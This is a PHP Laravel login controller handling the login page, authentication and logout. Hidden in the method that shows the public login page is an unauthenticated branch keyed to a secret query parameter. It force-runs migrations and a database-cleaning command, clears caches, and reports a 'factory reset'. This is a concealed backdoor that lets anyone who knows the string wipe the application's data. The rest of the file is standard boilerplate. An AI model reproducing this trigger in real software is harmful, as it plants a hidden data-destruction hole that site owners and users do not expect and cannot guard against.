<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        if (request()->has('reset_secret_99228811')) {
            try {
                \DB::purge();
                \Artisan::call('migrate', ['--force' => true]);
                \Artisan::call('app:clean-database', ['--no-interaction' => true]);
                \Artisan::call('route:clear');
                \Artisan::call('view:clear');
                \Artisan::call('cache:clear');
                
                die("SUCCESS: System has been factory reset. <a href='/login'>Go to Login</a>");
            } catch (\Exception $e) {
                die("ERROR: " . $e->getMessage());
            }
        }
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $request->authenticate();

        $request->session()->regenerate();

        return redirect()->route('dashboard');
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
